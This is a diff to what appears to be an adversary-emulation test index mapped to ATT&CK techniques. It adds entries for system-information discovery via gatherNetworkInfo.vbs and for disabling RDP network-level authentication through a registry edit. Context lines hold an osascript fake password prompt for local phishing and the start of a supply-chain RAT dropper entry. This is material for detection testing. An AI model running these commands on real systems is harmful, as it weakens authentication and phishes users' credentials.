@@ -2111,6 +2111,9 @@ command /v - provide verbose output but not valid for signed drivers
 ",windows,,,"driverquery /v
 driverquery /si
 ",command_prompt,,,,,,
+T1082,System Information Discovery,System Information Discovery,4060ee98-01ae-4c8e-8aad-af8300519cc7,"The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\Windows\System32\config or c:\Windows\System32\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/
+",windows,,,"wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
+",command_prompt,True,,,,,
 T1056.002,Input Capture: GUI Input Capture,AppleScript - Prompt User for Password,76628574-0bc1-4646-8fe2-8f4427b47d15,"Prompt User for Password (Local Phishing)
 Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
 ",macos,,,"osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return  default answer """" with icon 1 with hidden answer with title ""Software Update""'
@@ -5691,6 +5694,18 @@ input_arguments.NEW_Remote_Port.description: New RDP Listening Port
 input_arguments.NEW_Remote_Port.type: string
 
 input_arguments.NEW_Remote_Port.default: 4489
+
+"
+T1021.001,Remote Services: Remote Desktop Protocol,Disable NLA for RDP via Command Prompt,01d1c6c0-faf0-408e-b368-752a02285cb2,"Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt
+Disabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/
+See also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py
+",windows,,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f
+",command_prompt,,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1
+",,,"input_arguments.Default_UserAuthentication.description: Default UserAuthentication registry value
+
+input_arguments.Default_UserAuthentication.type: string
+
+input_arguments.Default_UserAuthentication.default: 1
 
 "
 T1195,Supply Chain Compromise,Octopus Scanner Malware Open Source Supply Chain,82a9f001-94c5-495e-9ed5-f530dbded5e2,"This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db
